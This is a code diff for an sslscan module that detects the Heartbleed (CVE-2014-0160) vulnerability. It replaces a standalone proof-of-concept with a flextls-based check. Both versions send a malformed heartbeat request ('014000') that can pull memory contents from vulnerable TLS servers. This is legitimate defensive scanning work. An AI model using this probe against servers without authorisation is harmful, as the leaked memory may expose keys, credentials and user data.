@@ -1,42 +1,19 @@
-# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford
-# (jspenguin@jspenguin.org)
 # https://tools.ietf.org/html/rfc6520
 
 import binascii
-import struct
-import select
-import time
+from datetime import datetime
 
 from sslscan import modules
 from sslscan.kb import ResultGroup, ResultValue
 from sslscan.module.scan import BaseScan
 
-
-def h2bin(x):
-    return binascii.unhexlify(x.replace(" ", "").replace("\n", "").encode("ASCII"))
-
-hello = h2bin("""
-16 03 02 00 dc 01 00 00  d8 03 02 53
-43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
-bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
-00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
-00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
-c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
-c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
-c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
-c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
-00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
-03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
-00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
-00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
-00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-00 0f 00 01 01
-""")
-
-hb = h2bin("""
-18 03 02 00 03
-01 40 00
-""")
+import flextls
+from flextls.exception import NotEnoughData
+from flextls.protocol.handshake import Handshake, ServerHello, ServerHelloDone
+from flextls.protocol.handshake.extension import Extension, Heartbeat as HeartbeatExtension
+from flextls.protocol.record import RecordSSLv3
+from flextls.protocol.heartbeat import Heartbeat
+from flextls.protocol.alert import Alert
 
 
 class VulnerabilityHeartbleed(BaseScan):
@@ -52,33 +29,108 @@ class VulnerabilityHeartbleed(BaseScan):
     def __init__(self, **kwargs):
         BaseScan.__init__(self, **kwargs)
 
-    def _recv_all(self, conn, length, timeout=5):
-        endtime = time.time() + timeout
-        rdata = b""
-        remain = length
-        while remain > 0:
-            rtime = endtime - time.time()
-            if rtime < 0:
-                return None
-            r, w, e = select.select([conn], [], [], 5)
-            if conn in r:
-                data = conn.recv(remain)
-                # EOF?
-                if not data:
-                    return None
-                rdata += data
-                remain -= len(data)
-        return rdata
+    def _send_heartbeat(self, protocol_version, cipher_suites):
 
-    def _recv_msg(self, conn):
-        hdr = self._recv_all(conn, 5)
-        if hdr is None:
-            return (None, None, None)
-        typ, ver, ln = struct.unpack(">BHH", hdr)
-        pay = self._recv_all(conn, ln, 10)
-        if pay is None:
-            return (None, None, None)
-        return(typ, ver, pay)
+        record_tls = self._build_tls_base_client_hello(
+            protocol_version,
+            cipher_suites
+        )
+
+        ext_hb = HeartbeatExtension()
+        ext_hb.mode = 1
+        record_client_hello = record_tls.payload.payload
+        record_client_hello.extensions.append(Extension() + ext_hb)
+
+        conn = self._scanner.handler.connect()
+        conn.settimeout(2.0)
+
+        conn.send(record_tls.encode())
+
+        time_start = datetime.now()
+        server_hello_done = False
+        heartbeat_supported = False
+        data = b""
+        while server_hello_done is False:
+            tmp_time = datetime.now() - time_start
+            if tmp_time.total_seconds() > 5.0:
+                return False
+
+            try:
+                tmp_data = conn.recv(4096)
+            except:
+                return None
+
+            data += tmp_data
+            while True:
+                try:
+                    (record, data) = RecordSSLv3.decode(data)
+                except NotEnoughData:
+                    break
+
+                if isinstance(record.payload, Handshake):
+                    if isinstance(record.payload.payload, ServerHello):
+                        server_hello = record.payload.payload
+                        for ext in server_hello.extensions:
+                            if isinstance(ext.payload, HeartbeatExtension):
+                                heartbeat_supported = True
+
+                    if isinstance(record.payload.payload, ServerHelloDone):
+                        server_hello_done = True
+
+                elif isinstance(record.payload, Alert):
+                    if record.payload.level == 2:
+                        return False
+
+        # ToDo: use connection state
+        if protocol_version == flextls.registry.version.SSLv3:
+            ver_minor = 0
+        elif protocol_version == flextls.registry.version.TLSv10:
+            ver_minor = 1
+        elif protocol_version == flextls.registry.version.TLSv11:
+            ver_minor = 2
+        elif protocol_version == flextls.registry.version.TLSv12:
+            ver_minor = 3
+
+        record = RecordSSLv3()
+        record.version.major = 3
+        record.version.minor = ver_minor
+
+        record.payload = binascii.unhexlify(b"014000")
+        record.length = 3
+        record.content_type = 24
+
+        conn.send(record.encode())
+        time_start = datetime.now()
+        record_with_heartbeat = None
+        data = b""
+        while record_with_heartbeat is None:
+            tmp_time = datetime.now() - time_start
+            if tmp_time.total_seconds() > 5.0:
+                return heartbeat_supported
+
+            try:
+                tmp_data = conn.recv(4096)
+            except:
+                return heartbeat_supported
+
+            data += tmp_data
+            while True:
+                try:
+                    (record, data) = RecordSSLv3.decode(
+                        data,
+                        payload_auto_decode=False
+                    )
+                except NotEnoughData:
+                    break
+
+                if record.content_type == record.get_payload_pattern(Heartbeat):
+                    record_with_heartbeat = record
+
+                elif isinstance(record.payload, Alert):
+                    if record.payload.level == 2:
+                        return heartbeat_supported
+
+        return record_with_heartbeat
 
     def run(self):
         kb = self._scanner.get_knowledge_base()
@@ -90,54 +142,61 @@ class VulnerabilityHeartbleed(BaseScan):
             )
         )
 
-        kb_vuln = ResultValue(
-            label="Vulnerable"
-        )
+        result_heartbeat = None
+        for protocol_version in self._scanner.get_enabled_versions():
+            if protocol_version != flextls.registry.version.SSLv2:
+                cipher_suites = flextls.registry.tls.cipher_suites.get_ids()
+                result_heartbeat = self._send_heartbeat(protocol_version, cipher_suites)
+                if result_heartbeat is not None:
+                    break
 
-        conn = self._scanner.handler.connect()
-        conn.send(hello)
-        while True:
-            typ, ver, payload = self._recv_msg(conn)
-            if typ is None:
-                kb_vuln.value = False
-                kb.set(
-                    "vulnerability.custom.heartbleed.vulnerable",
-                    kb_vuln
-                )
-                return
+        if result_heartbeat is None:
+            return
 
-            # Look for server hello done message.
-            if typ == 22 and ord(payload[0:1]) == 0x0E:
-                break
+        kb_supported = None
+        kb_vulnerable = None
+        if result_heartbeat is False:
+            kb_supported = False
+            kb_vulnerable = False
+        elif result_heartbeat is True:
+            kb_supported = True
+            kb_vulnerable = False
+        else:
+            kb_supported = True
+            kb_vulnerable = True
 
-        conn.send(hb)
-
-        payload = None
-        while True:
-            typ, ver, payload = self._recv_msg(conn)
-            if typ is None:
-                kb_vuln.value = False
-                break
-            if typ == 21:
-                kb_vuln.value = False
-                break
-            if typ == 24:
-                kb_vuln.value = True
-                break
-        payload_length = 0
-        if payload is not None:
-            payload = len(payload)
+        #print(hb.payload.payload)
         kb.set(
-            "vulnerability.custom.heartbleed.vulnerable",
-            kb_vuln
-        )
-        kb.set(
-            "vulnerability.custom.heartbleed.payload.length",
+            "vulnerability.custom.heartbleed.extension_present",
             ResultValue(
-                label="Payload-Length",
-                value=payload_length
+                label="Heartbeat Extension present",
+                value=kb_supported
             )
         )
+
+        kb.set(
+            "vulnerability.custom.heartbleed.vulnerable",
+            ResultValue(
+                label="Vulnerable",
+                value=kb_vulnerable
+            )
+        )
+
+        if kb_vulnerable is True:
+            payload = result_heartbeat.payload
+            # Remove 3-byte Heartbeat header from payload data
+            if len(payload) < 3:
+                payload = b""
+            else:
+                payload = payload[3:]
+
+            kb.set(
+                "vulnerability.custom.heartbleed.payload.length",
+                ResultValue(
+                    label="Payload-Length",
+                    value=len(payload)
+                )
+            )
 
 
 modules.register(VulnerabilityHeartbleed)
